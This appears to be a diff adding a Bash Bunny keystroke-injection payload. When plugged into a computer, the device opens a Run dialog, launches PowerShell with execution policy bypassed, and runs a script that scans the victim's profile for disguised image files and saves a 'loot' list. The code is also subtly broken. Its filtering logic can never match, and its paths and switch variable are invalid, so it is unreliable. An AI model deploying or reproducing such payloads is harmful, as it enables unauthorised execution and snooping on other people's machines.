@@ -1,0 +1,71 @@
+#!/bin/bash
+# Bash Bunny Payload - Search for Hidden Files
+
+# Set the target directory to the user's profile directory
+TARGET_DIR="$HOME"
+
+# Create the CSV output file in the loot directory
+OUTPUT_FILE="/root/loot/image-files/hidden-files.csv"
+touch $OUTPUT_FILE
+
+# Define the PowerShell script to search for hidden files
+POWERSHELL_SCRIPT=$(cat << 'EOF'
+# PowerShell script to search for hidden files
+
+# Set the target directory to search in
+$targetDir = "$env:USERPROFILE"
+
+# Set the output file path
+$outputFile = "/root/loot/image-files/hidden-files.csv"
+
+# Define the known file headers
+$fileHeaders = @{
+    ".jpg" = "FFD8FFE0" # JPEG
+    ".jpeg" = "FFD8FFE0" # JPEG
+    ".png" = "89504E47" # PNG
+    ".gif" = "47494638" # GIF
+    ".bmp" = "424D" # BMP
+    ".tiff" = "49492A00" # TIFF
+    ".mpg" = "000001BA" # MPEG
+}
+
+# Get all files in the target directory and its subdirectories
+$files = Get-ChildItem -Path $targetDir -Recurse
+
+# Loop through each file and check if it's a hidden image file
+foreach ($file in $files) {
+    # Ignore files with known extensions
+    if ($file.Extension -in @(".jpg", ".jpeg", ".png", ".gif", ".bmp", ".tiff", ".mpg")) {
+        continue
+    }
+
+    # Check if the file header matches a known file header
+    $fileHeader = Get-Content $file.FullName -Encoding Byte -Total 4 | % { $_.ToString("X2") }
+    $extension = $file.Extension.ToLower()
+    if ($fileHeaders.ContainsKey($extension) -and $fileHeaders[$extension] -contains $fileHeader) {
+        # If the file is a hidden file, write its path to the output file
+        "$($file.FullName), $($fileHeader)" | Out-File -FilePath $outputFile -Encoding utf8 -Append
+    }
+}
+EOF
+)
+
+# Copy the PowerShell script to the Bash Bunny's switch position 1
+echo "$POWERSHELL_SCRIPT" > /root/udisk/payload.ps1
+
+# Create the Bash Bunny payload
+echo "#!/bin/bash" > /root/udisk/payload.txt
+echo "LED ATTACK" >> /root/udisk/payload.txt
+echo "QUACK GUI r" >> /root/udisk/payload.txt
+echo "QUACK DELAY 500" >> /root/udisk/payload.txt
+echo "QUACK STRING powershell.exe -ExecutionPolicy Bypass -File \$(Switch1)\payload.ps1" >> /root/udisk/payload.txt
+echo "QUACK ENTER" >> /root/udisk/payload.txt
+echo "LED FINISH" >> /root/udisk/payload.txt
+
+# Finish the payload
+chmod +x /root/udisk/payload.txt
+sync
+
+# Eject the Bash Bunny and switch it to arming mode
+echo "You can now eject the Bash Bunny and switch it to arming mode."
+LED ATTACK
